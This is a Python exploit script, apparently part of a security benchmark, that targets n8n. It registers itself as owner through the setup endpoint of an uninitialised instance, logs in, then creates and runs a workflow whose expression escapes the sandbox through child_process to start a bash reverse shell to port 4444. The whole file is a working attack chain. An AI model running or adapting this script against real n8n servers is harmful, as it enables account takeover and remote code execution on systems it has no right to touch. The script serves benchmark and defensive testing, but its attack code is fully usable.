#!/usr/bin/env python3
"""Run a Bash shell through n8n's expression sandbox escape."""

import http.cookiejar
import json
import os
import secrets
import time
import urllib.error
import urllib.request


SHELL_COMMAND = "bash -c 'bash -i >& /dev/tcp/localhost/4444 0>&1'"


def request_json(
    opener: urllib.request.OpenerDirector,
    url: str,
    payload: dict | None = None,
) -> tuple[int, dict]:
    body = None if payload is None else json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json"} if body else {},
    )
    try:
        response = opener.open(request, timeout=30)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        content = response.read().decode("utf-8")
        return response.status, json.loads(content)


def require_data(status: int, response: dict, action: str) -> dict:
    data = response.get("data")
    if status != 200 or not isinstance(data, dict):
        raise RuntimeError(f"n8n {action} failed with HTTP {status}")
    return data


def setup_owner(opener: urllib.request.OpenerDirector, base_url: str) -> None:
    suffix = secrets.token_hex(8)
    email = f"owner-{suffix}@local.invalid"
    password = secrets.token_urlsafe(24)
    status, response = request_json(
        opener,
        f"{base_url}/rest/owner/setup",
        {
            "email": email,
            "firstName": "Benchmark",
            "lastName": "Owner",
            "password": password,
        },
    )
    require_data(status, response, "owner setup")
    status, response = request_json(
        opener,
        f"{base_url}/rest/login",
        {"email": email, "password": password},
    )
    require_data(status, response, "login")


def make_workflow() -> dict:
    nonce = secrets.token_hex(8)
    expression = (
        '={{ (function() { this.process.mainModule.require("child_process").exec('
        + json.dumps(SHELL_COMMAND)
        + '); return "started"; })() }}'
    )
    trigger_name = f"Trigger-{nonce}"
    command_name = f"Expression-{nonce}"
    nodes = [
        {
            "parameters": {},
            "name": trigger_name,
            "type": "n8n-nodes-base.manualTrigger",
            "typeVersion": 1,
            "position": [100, 100],
            "id": f"trigger-{nonce}",
        },
        {
            "parameters": {
                "values": {"string": [{"name": "result", "value": expression}]}
            },
            "name": command_name,
            "type": "n8n-nodes-base.set",
            "typeVersion": 2,
            "position": [300, 100],
            "id": f"expression-{nonce}",
        },
    ]
    connections = {
        trigger_name: {
            "main": [[{"node": command_name, "type": "main", "index": 0}]]
        }
    }
    return {
        "name": f"expression-test-{nonce}",
        "active": False,
        "nodes": nodes,
        "connections": connections,
        "settings": {},
    }


def trigger_expression(
    opener: urllib.request.OpenerDirector,
    base_url: str,
) -> int:
    workflow = make_workflow()
    status, response = request_json(
        opener, f"{base_url}/rest/workflows", workflow
    )
    workflow_id = require_data(status, response, "workflow creation").get("id")
    if not workflow_id:
        raise RuntimeError("n8n workflow creation returned no ID")
    run_data = {"workflowData": {"id": workflow_id, **workflow}}
    status, response = request_json(
        opener,
        f"{base_url}/rest/workflows/{workflow_id}/run",
        run_data,
    )
    if not require_data(status, response, "workflow execution").get("executionId"):
        raise RuntimeError("n8n workflow execution returned no ID")
    return status


def main() -> None:
    base_url = (
        os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    ).rstrip("/")
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
    )
    setup_owner(opener, base_url)
    status = trigger_expression(opener, base_url)
    time.sleep(3)
    print(json.dumps({"evidence_payload": {}, "request_status": status}))


if __name__ == "__main__":
    main()
